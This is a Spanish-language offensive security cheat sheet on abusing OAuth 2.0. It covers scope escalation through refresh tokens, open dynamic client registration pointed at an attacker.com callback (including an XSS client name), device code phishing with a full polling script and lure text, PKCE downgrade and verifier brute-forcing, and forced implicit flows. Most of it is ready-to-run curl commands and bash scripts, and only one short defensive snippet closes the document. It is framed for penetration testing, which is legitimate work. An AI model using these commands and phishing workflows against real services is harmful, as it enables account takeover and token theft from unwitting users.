---
aliases:
  - OAuth Scope Abuse
  - OAuth Consent Bypass
  - PKCE Downgrade
  - Device Code Phishing
tags:
  - vuln/oauth
  - technique/privilege-escalation
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[Phishing]]"
---
# OAuth 2.0 - Scope, Consent & Flow Abuse

---

## Scope Upgrade / Silent Re-Consent

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/oauth/token -d "grant_type=refresh_token&refresh_token=$RT&scope=email admin internal&client_id=APP&client_secret=SECRET"` | Refresh con scope expandido | Server acepta scope mayor que original. |
| `curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&prompt=none&scope=email admin&redirect_uri=...&state=X"` | Silent re-consent con scope ampliado | `prompt=none` + cumulative grants. |
| `for s in 'email' 'profile email' 'admin' 'internal' '*'; do curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&scope=$s&..."; done` | Probe scopes aceptados | Custom/wildcard scope discovery. |
| `curl ... -d "scope=offline_access"` en token request | Force refresh_token con offline | Persistencia long-term. |
| Capturar access_token + decode JWT con `jwt-cli decode` | Verificar scopes efectivos | Confirmación scope upgrade. |
^oauth-abuse-scope

### Test silent upgrade

```bash
RT="capture_via_legit_flow"

# Refresh con scope ampliado
curl -s -X POST https://target/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$RT" \
  -d "scope=email admin internal" \
  -d "client_id=APP" \
  -d "client_secret=SECRET" | jq .

# Si returns access_token con scope=admin (no granted by user) → vuln
```

---

## Dynamic Client Registration

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s -X POST https://target/oauth/register -H 'Content-Type: application/json' -d '{"client_name":"x","redirect_uris":["https://attacker.com/cb"]}'` | Test endpoint público de registro | RFC 7591 endpoint expuesto sin auth. |
| `curl -s https://target/.well-known/openid-configuration \| jq '.registration_endpoint'` | Discover registration endpoint | Pre-attack discovery. |
| `curl -X POST .../register -d '{"client_name":"x","redirect_uris":["..."],"grant_types":["authorization_code","refresh_token","password","client_credentials"],"scope":"openid email profile admin internal","token_endpoint_auth_method":"none"}'` | Registrar client público con scopes amplios | Endpoint sin restricción de grants/scopes. |
| `curl -X POST .../register -d '{"client_name":"<script>alert(1)</script>"}'` | XSS en consent UI | logo_uri/client_name reflectado. |
| Post-registration: usar `client_id` retornado en flow normal con `redirect_uri=https://attacker.com/cb` | Code theft setup | Atacante controla client. |
^oauth-abuse-registration

### Test endpoint registration

```bash
curl -s -X POST https://target/oauth/register \
  -H 'Content-Type: application/json' \
  -d '{
    "client_name": "MaliciousApp",
    "redirect_uris": ["https://attacker.com/cb"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "scope": "openid email profile admin internal",
    "token_endpoint_auth_method": "none"
  }' | jq .

# Returns client_id (+ client_secret) → registration abierto
```

---

## Device Code Phishing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s -X POST https://target/oauth/device/code -d "client_id=APP&scope=openid email offline_access" \| jq .` | Inicia device flow → recibe `user_code` y `verification_uri` | Atacante setup. |
| Phishing email/Slack: "Confirma tu cuenta — código `XXXX-YYYY` en https://target/device" | Víctima ingresa código → atacante's device autenticado | Social engineering. |
| `while true; do curl -s -X POST https://target/oauth/token -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=$DC&client_id=APP" \| jq -e .access_token && break; sleep 5; done` | Poll hasta víctima approve | Standard polling. |
| Generate QR de `verification_uri_complete` con código pre-filled | One-click victim flow | QR phishing convenience. |
| Microsoft `https://microsoft.com/devicelogin` con código atacante | Real-world MS OAuth target | Exchange/Azure abuse. |
^oauth-abuse-devicephishing

### Workflow atacante completo

```bash
# Step 1 — Atacante starts device flow
RESP=$(curl -s -X POST https://target/oauth/device/code \
  -d "client_id=APP" -d "scope=openid email profile offline_access")
DEVICE_CODE=$(echo "$RESP" | jq -r .device_code)
USER_CODE=$(echo "$RESP" | jq -r .user_code)
URI=$(echo "$RESP" | jq -r .verification_uri_complete)

echo "Phishing payload:"
echo "  Send victim: $URI"
echo "  Code: $USER_CODE"

# Step 2 — Atacante poll
while true; do
  TOKEN_RESP=$(curl -s -X POST https://target/oauth/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "device_code=$DEVICE_CODE" \
    -d "client_id=APP")
  if echo "$TOKEN_RESP" | jq -e .access_token > /dev/null; then
    echo "$TOKEN_RESP" | jq .
    break
  fi
  sleep 5
done
```

---

## PKCE Downgrade

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST https://target/oauth/token -d "grant_type=authorization_code&code=$CODE&redirect_uri=...&client_id=APP"` (sin `code_verifier`) | Test PKCE enforcement | Server no fuerza PKCE → vulnerable. |
| `curl -sI "https://target/oauth/authorize?...&code_challenge=$CHALLENGE&code_challenge_method=plain"` | Force `plain` method (no SHA256) | Plain permite sniff = no defensa. |
| `curl ... -d "code_verifier=AAA"` con verifier corto | Test verifier weak entropy acceptance | Server no valida longitud. |
| `code=$(generate_code) && for v in {a..z}{a..z}{a..z}; do curl ... -d "code_verifier=$v"; done` (brute si verifier corto) | Brute weak verifier | Verifier <43 chars y reusable. |
| Inspeccionar localStorage post-flow para `code_verifier` | XSS combo — verifier en client storage | App guarda verifier sin proteger. |
^oauth-abuse-pkce

### Test PKCE enforcement

```bash
# 1. Inicia flow con code_challenge
CHALLENGE="e9melhoraVjGgkw5jZcN-FWYwXJ_yA-mqK0c5fgKOfg"
curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email&state=X&code_challenge=$CHALLENGE&code_challenge_method=S256"

# 2. Capturar code emitido del callback

# 3. Exchange SIN code_verifier (debe fallar si PKCE enforced)
curl -s -X POST https://target/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "redirect_uri=https://known.com/cb" \
  -d "client_id=APP" | jq .

# Si returns access_token → PKCE no enforced
```

---

## Implicit Flow Forced

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/oauth/authorize?client_id=APP&response_type=token&redirect_uri=https://known.com/cb&scope=email&state=X"` | Test si server acepta implicit flow | Legacy support. |
| `curl -sI "https://target/oauth/authorize?...&response_type=code id_token token&..."` | Hybrid flow → multiple credentials en fragment | Triple credential leak. |
| Force `response_type=token` en lugar de `code` en links phishing | Token directo en URL fragment | Más fácil de robar via Referer/XSS. |
| Combine con `prompt=none`: `?response_type=token&prompt=none&...` | Silent token grant | Bypass UI consent. |
| Combine con `display=popup`: PoC popup → window.opener postMessage | Token vía popup | postMessage chain. |
| `response_type=id_token`: solo JWT en fragment | OIDC variant | id_token theft. |
^oauth-abuse-implicit

### Force downgrade test

```http
# Atacante phishing link forza response_type=token
GET /oauth/authorize?
  client_id=APP&
  response_type=token&
  redirect_uri=https://attacker-via-bypass/cb&
  scope=email&
  state=X
```

```python
# Server SAFE — restrict response_type per client
ALLOWED_RESPONSE_TYPES_PER_CLIENT = {
    'web_app': ['code'],
    'spa': ['code'],
    'mobile': ['code'],
}

if response_type not in ALLOWED_RESPONSE_TYPES_PER_CLIENT.get(client_id, []):
    abort(400, 'response_type not allowed for this client')
```

---
